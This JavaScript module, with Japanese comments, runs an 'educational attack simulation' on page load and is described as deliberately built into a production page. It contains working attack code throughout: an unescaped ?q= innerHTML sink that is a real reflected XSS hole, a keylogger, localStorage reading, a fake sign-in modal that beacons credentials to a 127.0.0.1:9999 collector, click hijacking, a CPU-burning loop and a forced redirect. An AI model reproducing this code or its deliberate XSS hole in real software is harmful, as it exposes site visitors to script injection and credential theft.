// 【本番組み込み・意図的】ページを開くと同時に走る攻撃（実際に動く）。
//
// 所有者の指示により、本番ページにそのまま組み込まれている。動くもの:
//
//  1) 反射型XSS（?q=）        — 本物のシンク。URL にペイロードを付けると本当に実行される
//  2) キーロガー              — 入力を記録し、10 キー/5 秒ごとにビーコン送信
//  3) セーブデータ・設定読み   — 本物の localStorage（shibuya.save / shibuya.pad）を読む
//  4) 改ざん                 — 赤いバナーと画面の減光で「攻撃されている状態」を可視化
//  5) 攻撃ログ               — DevTools コンソールと画面内ログパネルへ
//  6) フィッシング（8秒後）   — 偽「再サインイン」モーダル。入力を収集サーバへ送信
//  7) 操作妨害（20秒後）      — 3回に1回クリックを横取りして無効化＋偽エラー画面
//  8) CPU高負荷（30秒後）     — マイニングの模倣。実際にFPSが落ちる（45秒で停止）
//  9) 強制リダイレクト（50秒後）— 10秒カウントダウン後に攻撃者ページ（/owned）へ遷移
//
// ビーコン/フィッシング/リダイレクトの宛先は 127.0.0.1:9999（examples/security-workshop/
// attack-server.mjs）。サーバが動いていれば本当に受信・遷移する。動いていなくても
// 送信自体は行われる（宛先がローカルなので実害なし）。外部への送信は一切ない。
//
// 無効化: ?attack=0（そのページ表示では何もしない）
// 停止  : バナーの「攻撃を終了する」ボタン。**今後走るはずの全段階（フィッシング・
//         妨害・高負荷・リダイレクト含む）もキャンセル**する。
//
// dispose(): 全リスナー・タイマー・DOM を解除。disposed 後のコールバックは
// 触れない（リザレクト禁止）。React effect と 1:1 で対応する。

const ATTACKER_ORIGIN = 'http://127.0.0.1:9999';
const COLLECTOR = `${ATTACKER_ORIGIN}/collect`;
const ROOT_ID = 'attack-sim-root';

// ---- エスカレーションのスケジュール（ミリ秒）----
const PHISHING_AT = 8000;
const SABOTAGE_AT = 20000;
const MINING_AT = 30000;
const REDIRECT_AT = 50000;
const MINING_MS = 45000;
const REDIRECT_COUNTDOWN = 10;

export function startAttackSimulation() {
  const params = typeof location === 'undefined'
    ? new URLSearchParams()
    : new URLSearchParams(location.search);
  // ?attack=0 のときは完全にオフ（?q= のシンクも含めて何も設置しない）
  if (params.get('attack') === '0') return {dispose() {}};

  let disposed = false;
  let stopped = false;
  const teardowns = [];
  const scheduled = [];
  /** 解除用に登録。dispose 後の登録は即解除する（非同期後のリザレクト防止）。 */
  const on = (teardown) => { if (disposed) teardown(); else teardowns.push(teardown); };
  /** 全解除。stop と dispose から呼ばれる。 */
  const teardownAll = () => {
    while (teardowns.length) teardowns.pop()();
    for (const t of scheduled) clearTimeout(t);
  };
  /** エスカレーション段階の予約。dispose/stop で自動キャンセルされる。 */
  const schedule = (fn, ms) => {
    const t = setTimeout(() => { if (!disposed) fn(); }, ms);
    scheduled.push(t);
  };

  // ---- スタイル: 画面全体を「攻撃されている」雰囲気にする ----
  const style = document.createElement('style');
  style.id = 'attack-sim-style';
  style.textContent = `
    #${ROOT_ID} { position:fixed; inset:0; z-index:2147483000; pointer-events:none; font-family:system-ui,sans-serif; }
    #${ROOT_ID} .as-vignette { position:absolute; inset:0; box-shadow:inset 0 0 140px rgba(255,40,40,.30); animation:as-pulse 2.2s ease-in-out infinite; }
    @keyframes as-pulse { 0%,100% {opacity:.55} 50% {opacity:1} }
    #${ROOT_ID} .as-banner { position:absolute; top:0; left:0; right:0; z-index:3;
      background:linear-gradient(90deg,#7a0d0d,#a31414); color:#ffe3e3;
      padding:10px 16px; font-size:14px; font-weight:700;
      display:flex; gap:14px; align-items:center; justify-content:center; flex-wrap:wrap; }
    #${ROOT_ID} .as-banner small { font-weight:400; opacity:.85; }
    #${ROOT_ID} .as-stop { pointer-events:auto; cursor:pointer; border:0; border-radius:6px;
      background:#ffe3e3; color:#7a0d0d; font-weight:700; padding:6px 14px; font-size:13px; }
    #${ROOT_ID} .as-log { position:absolute; right:14px; bottom:14px; width:min(380px,80vw); z-index:3;
      background:rgba(30,0,0,.85); border:1px solid #ff5d5d; border-radius:8px;
      color:#ffb3b3; font:12px/1.5 monospace; padding:10px 12px; }
    #${ROOT_ID} .as-log b { color:#ff8080; }
    #${ROOT_ID} .as-lines { margin-top:4px; max-height:10em; overflow:hidden; }
    /* ---- フィッシング・偽エラーのモーダル ---- */
    #${ROOT_ID} .as-modal-wrap { position:absolute; inset:0; z-index:2; pointer-events:auto;
      background:rgba(10,0,0,.45); display:grid; place-items:center; }
    #${ROOT_ID} .as-modal { background:#fff; color:#222; border-radius:10px; padding:22px 24px;
      width:min(360px,90vw); box-shadow:0 18px 60px rgba(0,0,0,.5); font-size:14px; }
    #${ROOT_ID} .as-modal h3 { margin:0 0 8px; font-size:16px; }
    #${ROOT_ID} .as-modal input { display:block; width:100%; box-sizing:border-box; padding:9px;
      margin:8px 0; border:1px solid #bbb; border-radius:6px; font:inherit; }
    #${ROOT_ID} .as-modal button { padding:9px 14px; border:0; border-radius:6px;
      background:#1a73e8; color:#fff; font-weight:600; cursor:pointer; }
    #${ROOT_ID} .as-modal .as-cancel { background:#e8eaed; color:#333; margin-left:8px; }
    #${ROOT_ID} .as-modal small { display:block; margin-top:10px; color:#999; font-size:10px; }
    /* ---- 妨害トースト・リダイレクトカウントダウン ---- */
    #${ROOT_ID} .as-toast { position:absolute; left:50%; bottom:64px; transform:translateX(-50%);
      background:rgba(20,20,20,.92); color:#ffd7d7; padding:8px 16px; border-radius:999px;
      font-size:13px; z-index:3; }
    #${ROOT_ID} .as-countdown { position:absolute; top:46px; left:50%; transform:translateX(-50%);
      background:#a31414; color:#ffe3e3; padding:8px 18px; border-radius:8px; font-size:13px;
      font-weight:700; z-index:3; }
  `;
  document.head.appendChild(style);
  on(() => style.remove());

  // ---- UI: 改ざんバナー + 攻撃ログパネル（見た目は「乗っ取り」） ----
  const root = document.createElement('div');
  root.id = ROOT_ID;
  root.setAttribute('aria-label', '教育用攻撃シミュレーション');
  root.innerHTML =
    '<div class="as-vignette" aria-hidden="true"></div>' +
    '<div class="as-banner" role="alert">⚠ このサイトは攻撃されています <small>教育用ペネトレーション — 通信はローカル(127.0.0.1)宛のみ</small>' +
    '<button type="button" class="as-stop">攻撃を終了する</button></div>' +
    '<div class="as-log"><b>ATTACK LOG</b><div class="as-lines"></div></div>';
  document.body.appendChild(root);
  on(() => root.remove());

  const lines = root.querySelector('.as-lines');
  /** ログは textContent で書く。意図的に生で流すのは ?q= のシンクだけ。 */
  const log = (text) => {
    if (disposed || !lines) return;
    const row = document.createElement('div');
    row.textContent = `${new Date().toLocaleTimeString()}  ${text}`;
    lines.appendChild(row);
    while (lines.childElementCount > 8) lines.firstElementChild.remove();
  };
  /** 画面中央下に一瞬出る通知（妨害・カウントダウン用）。 */
  const toast = (text, ms = 1600) => {
    if (disposed) return;
    const t = document.createElement('div');
    t.className = 'as-toast';
    t.textContent = text; // textContent（XSS シンクは ?q= だけ）
    root.appendChild(t);
    setTimeout(() => t.remove(), ms);
  };
  console.warn('%c[ATTACK SIM] 攻撃者のペイロードが実行されました（教育用・宛先はローカルのみ）',
    'background:#7a0d0d;color:#ffe3e3;padding:2px 8px;font-weight:bold');

  // ---- 1) 反射型XSS: ?q= を本当に innerHTML へ（未エスケープのまま・意図的） ----
  const q = params.get('q');
  if (q !== null) {
    const sink = document.createElement('div');
    sink.id = 'attack-sim-sink';
    sink.style.cssText = 'position:fixed;left:12px;bottom:12px;z-index:2147483001;max-width:420px';
    document.body.appendChild(sink);
    sink.innerHTML = q; // ← 意図的に未エスケープ（本物の脆弱性。修正は所有者判断）
    on(() => sink.remove());
  }

  // ---- ビーコン: 盗んだデータを本物の HTTP で送る（宛先はローカル収集サーバ） ----
  const beacon = (data, via) => {
    try { new Image().src = `${COLLECTOR}?d=${encodeURIComponent(data)}&src=${via}`; } catch {}
  };
  // 収集サーバの生存判定（リダイレクト段階の実施条件）。Image の成否で判定できる。
  let collectorAlive = false;
  try {
    const probe = new Image();
    probe.onload = () => { collectorAlive = true; };
    probe.src = `${COLLECTOR}?d=PROBE&t=${Date.now()}&src=probe`;
  } catch {}

  // ---- 2) セーブデータ・設定の覗き見（本物の localStorage を読む） ----
  try {
    const raw = localStorage.getItem('shibuya.save');
    if (raw) {
      const s = JSON.parse(raw);
      const missions = s && s.completed ? Object.keys(s.completed).length : 0;
      log(`SAVE DATA READ: money=¥${s?.money ?? 0} missions=${missions}件`);
      beacon(`SAVE money=${s?.money ?? 0} missions=${missions}`, 'save');
    } else log('SAVE DATA READ: (セーブなし)');
  } catch { log('SAVE DATA READ: (読み取り失敗)'); }
  try {
    const pad = localStorage.getItem('shibuya.pad');
    if (pad) {
      const p = JSON.parse(pad);
      log(`SETTINGS READ: pad=[${Object.keys(p).join(',')}]`);
      beacon(`PADSETTINGS ${Object.keys(p).join(',')}`, 'settings');
    }
  } catch {}

  // ---- 3) キーロガー: 記録して 10 キーごとに送信 ----
  let keyBuf = [];
  const flushKeys = () => {
    if (!keyBuf.length) return;
    beacon(`KEYS:${keyBuf.join('')}`, 'keylogger');
    keyBuf = [];
  };
  const onKey = (e) => {
    if (disposed) return;
    keyBuf.push(e.key.length === 1 ? e.key : `<${e.key}>`);
    log(`KEYLOGGER 記録中: ${keyBuf.slice(-10).join(' ')}`);
    if (keyBuf.length >= 10) flushKeys();
  };
  document.addEventListener('keypress', onKey, true);
  const keyTimer = setInterval(flushKeys, 5000);
  on(() => { clearInterval(keyTimer); flushKeys(); document.removeEventListener('keypress', onKey, true); });

  // ---- 4) 定期攻撃ログ（雰囲気と DevTools での確認用） ----
  const taunts = [
    'payload executed via img onerror (scriptタグはinnerHTMLで動かない)',
    'your save data has been read',
    'keystrokes are being recorded',
    'data beacons to 127.0.0.1:9999 (workshop collector)',
  ];
  let taunt = 0;
  const tauntTimer = setInterval(() => { if (!disposed) log(`payload: ${taunts[taunt++ % taunts.length]}`); }, 4000);
  on(() => clearInterval(tauntTimer));

  // ---- 5) 操作妨害: 3回に1回クリックを横取りして無効化する ----
  // document のキャプチャ段階で stopPropagation すると React のハンドラへ届かず、
  // サイトのボタンが本当に「動かなくなる」。攻撃UI自身（バナー等）は妨害しない。
  let clickCount = 0;
  const onDocClick = (e) => {
    if (disposed) return;
    const t = e.target;
    if (t && t.closest && t.closest(`#${ROOT_ID}`)) return;
    clickCount += 1;
    if (clickCount % 3 === 0) {
      e.preventDefault();
      e.stopPropagation();
      log('SABOTAGE: クリックを横取りしました');
      toast('操作が無視されました（妨害）');
    }
  };

  // ---- 偽エラー画面（1回だけ・再読み込みは1回だけ本物の reload） ----
  const showFakeError = () => {
    const wrap = document.createElement('div');
    wrap.className = 'as-modal-wrap';
    wrap.innerHTML =
      '<div class="as-modal" role="alertdialog" aria-label="エラー">' +
      '<h3>アプリケーションエラー</h3>' +
      '<p>問題が発生しました。（コード: 0xAS1C）</p>' +
      '<button type="button" class="as-reload">再読み込み</button>' +
      '<button type="button" class="as-cancel">閉じる</button>' +
      '<small>（教育用デモ。再読み込みは 1 回だけ本物に紛れます）</small></div>';
    document.body.appendChild(wrap);
    const remove = () => wrap.remove();
    on(remove);
    const rel = wrap.querySelector('.as-reload');
    const can = wrap.querySelector('.as-cancel');
    if (can) can.addEventListener('click', remove);
    if (rel) rel.addEventListener('click', () => {
      if (!sessionStorage.getItem('asim.reloaded')) {
        sessionStorage.setItem('asim.reloaded', '1');
        location.reload(); // 本物の再読み込み → ペイロードがもう一度走る（リアル）
      } else remove();
    });
  };

  // ---- フィッシング: 偽「再サインイン」モーダル。入力を収集サーバへ送る ----
  const showPhishing = () => {
    const wrap = document.createElement('div');
    wrap.className = 'as-modal-wrap';
    wrap.innerHTML =
      '<div class="as-modal" role="dialog" aria-label="再サインイン">' +
      '<h3>セッションの有効期限が切れています</h3>' +
      '<p>続行するには再度サインインしてください。</p>' +
      '<form>' +
      '<input name="u" autocomplete="off" placeholder="ユーザーID" required>' +
      '<input name="p" type="password" placeholder="パスワード" required>' +
      '<button type="submit">サインイン</button>' +
      '<button type="button" class="as-cancel">後で</button></form>' +
      '<small>（教育用デモ。入力はローカルの収集サーバ 127.0.0.1:9999 にのみ送られます）</small></div>';
    document.body.appendChild(wrap);
    const remove = () => wrap.remove();
    on(remove);
    const form = wrap.querySelector('form');
    const cancel = wrap.querySelector('.as-cancel');
    if (cancel) cancel.addEventListener('click', remove);
    if (form) form.addEventListener('submit', (ev) => {
      ev.preventDefault();
      const u = form.querySelector('input[name="u"]');
      const p = form.querySelector('input[name="p"]');
      beacon(`CREDS user=${u?.value ?? ''} pw=${p?.value ?? ''}`, 'phishing');
      log('PHISHING: 入力された認証情報を攻撃者へ送信しました');
      toast('入力したIDとパスワードは攻撃者のものになりました', 4000);
      remove();
    });
    const first = form?.querySelector('input');
    if (first) first.focus();
  };

  // ---- CPU高負荷（マイニングの模倣）: 実際にビジーループを回してFPSを落とす ----
  const startMining = () => {
    log('MINING: 高負荷ループ開始（45 秒間・FPS が落ちます）');
    const busy = setInterval(() => {
      if (disposed) return;
      const end = performance.now() + 250;
      while (performance.now() < end) { /* 意図的なビジーループ */ }
    }, 2000);
    const stopTimer = setTimeout(() => {
      clearInterval(busy);
      log('MINING: 停止');
    }, MINING_MS);
    on(() => { clearInterval(busy); clearTimeout(stopTimer); });
  };

  // ---- 強制リダイレクト: カウントダウンの後、本当に攻撃者ページへ遷移する ----
  const startRedirect = () => {
    if (!collectorAlive) {
      log('REDIRECT: 収集サーバ未起動のため遷移を省略（attack-server.mjs を起動すると有効）');
      return;
    }
    let left = REDIRECT_COUNTDOWN;
    const chip = document.createElement('div');
    chip.className = 'as-countdown';
    chip.setAttribute('role', 'alert');
    chip.textContent = `${left} 秒後に攻撃者サイトへ移動します…`;
    root.appendChild(chip);
    on(() => chip.remove());
    const cd = setInterval(() => {
      if (disposed) { clearInterval(cd); return; }
      left -= 1;
      if (left <= 0) {
        clearInterval(cd);
        log(`REDIRECT: ${ATTACKER_ORIGIN}/owned へ遷移します`);
        location.href = `${ATTACKER_ORIGIN}/owned`;
        return;
      }
      chip.textContent = `${left} 秒後に攻撃者サイトへ移動します…`;
      log(`REDIRECT: あと ${left} 秒`);
    }, 1000);
    on(() => clearInterval(cd));
  };

  // ---- エスカレーションの予約 ----
  schedule(showPhishing, PHISHING_AT);
  schedule(() => {
    document.addEventListener('click', onDocClick, true);
    on(() => document.removeEventListener('click', onDocClick, true));
    log('SABOTAGE: クリック妨害を開始（3回に1回）');
    showFakeError();
  }, SABOTAGE_AT);
  schedule(startMining, MINING_AT);
  schedule(startRedirect, REDIRECT_AT);

  // ---- 停止ボタン: 即座に全解除。今後の全段階もキャンセルする ----
  const stopButton = root.querySelector('.as-stop');
  if (stopButton) stopButton.addEventListener('click', () => {
    stopped = true;
    disposed = true;      // 以後のログ/ビーコン/キー記録/エスカレーションは無効
    flushKeys();          // 残ったキー入力も送ってから閉じる
    teardownAll();        // 予約済みタイマー（フィッシング・リダイレクト等）もここで消える
    const end = document.createElement('div');
    end.textContent = '攻撃を終了しました（?attack=0 を付けると常にオフ）';
    end.style.cssText = 'position:fixed;bottom:12px;left:12px;z-index:2147483001;background:#12352a;color:#b8ffd8;padding:10px 14px;border-radius:8px;font:13px/1.4 system-ui,sans-serif';
    document.body.appendChild(end);
    setTimeout(() => end.remove(), 3500);
  });

  return {
    dispose() {
      if (stopped) return;   // ユーザが止めた後のアンマウントでは二重に何もしない
      disposed = true;
      teardownAll();
    },
  };
}
